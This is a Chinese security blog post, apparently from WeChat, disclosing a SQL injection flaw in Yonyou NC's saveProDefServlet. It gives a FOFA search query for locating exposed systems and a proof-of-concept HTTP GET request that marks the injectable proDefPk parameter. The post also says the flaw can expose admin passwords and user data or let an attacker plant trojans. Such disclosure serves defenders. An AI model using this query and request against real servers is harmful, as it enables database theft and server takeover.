> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkxOTIzNDgwMQ==&mid=2247484679&idx=1&sn=ccaffdcd00b07f198b98052823993e9f

#  用友nc saveProDefServlet SQL注入漏洞  
原创 小白爱学习Sec  小白爱学习Sec   2025-06-20 00:01  
  
**免责声明**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic&random=0.18042352401019524&random=0.49301784938611526&random=0.7409665131631742 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7L4WY53VhUO2spBG8TGAPF8o98Ac6Y3EPLSEFGmKXeZyQCOGkqFWbeMibTfC1wZLjJTDmLb4Z0P9VCAV3RLDbbQ/640?random=0.11828586430527777&random=0.3266770581654057&random=0.7229092426155448 "")  
  
本文旨在提供有关特定漏洞工具或安全风险的详细信息，以帮助安全研究人员、系统管理员和开发人员更好地理解和修复潜在的安全威胁，协助提高网络安全意识并推动技术进步，而非出于任何恶意目的。利用本文提到的漏洞信息或进行相关测试可能会违反法律法规或服务协议。  
作者不对读者基于本文内容而产生的任何行为或后果承担责任。  
如有任何侵权问题，请联系作者删除。  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**简单介绍**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进⼀步获取服务器系统权限。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**复现环境**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
FOFA: app="用友-UFIDA-NC"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/x095A8xUTuXutnj0wTQicfyqw8MT1THozapgicHQFibfYTyYugTxIQbwg3I0YFSCE7FWS3AyQ1FTUMNglRXoHibYHg/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**漏洞POC**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  

```
GET /portal/pt/servlet/saveProDefServlet/doPost?pageId=login&proDefPk=1*&prodefxml=1 HTTP/1.1
Host: xxxxx


```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/x095A8xUTuXutnj0wTQicfyqw8MT1THozgiarSsSbzziajYRDOIq4bjl8BWBRDHC4bDH0dMC1EtwrakcPJHRBDdoQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/x095A8xUTuWMRpvvqmMwKABosFPL6ptacLNz6fxia55bJuCgfYNDtSfiaSIZ9nU9IxDicXfNricwyMTJZUgo9dIgTg/640?wx_fmt=gif&from=appmsg "")  
  
创作不易，点赞、分享、转发支持一下吧！！  
  
  
  
  
